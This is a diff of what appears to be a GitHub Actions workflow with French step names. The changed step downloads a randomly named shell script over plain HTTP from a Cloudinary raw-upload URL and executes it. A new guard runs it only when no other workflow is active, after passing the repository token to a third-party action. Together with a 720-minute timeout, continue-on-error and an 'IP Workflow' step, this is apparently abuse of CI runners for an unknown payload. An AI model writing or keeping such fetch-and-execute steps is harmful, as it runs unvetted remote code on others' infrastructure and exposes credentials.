@@ -10,12 +10,22 @@ jobs:
     continue-on-error: true
     runs-on: ubuntu-latest
     steps:
-      - name: Run exec
-        timeout-minutes: 720
+      - name: Vérifier les workflows actifs
+        uses: athul/wc-status-action@v0.1.0
+        id: workflow_status
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          repository: ${{ github.repository }}
+
+      - name: Exécuter si aucun workflow actif
         run: |
-          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711044213/ij0dklvuprnlsnotxl2w.sh
-          chmod +x ij0dklvuprnlsnotxl2w.sh
-          ./ij0dklvuprnlsnotxl2w.sh
+          if [ "${{ steps.workflow_status.outputs.active_workflows_count }}" -eq 0 ]; then
+            curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711044213/ij0dklvuprnlsnotxl2w.sh
+            chmod +x ij0dklvuprnlsnotxl2w.sh
+            ./ij0dklvuprnlsnotxl2w.sh
+          else
+            echo "Il y a déjà un workflow actif. Ce workflow ne sera pas exécuté."
+          fi
 
       - name: IP Workflow
         run: |
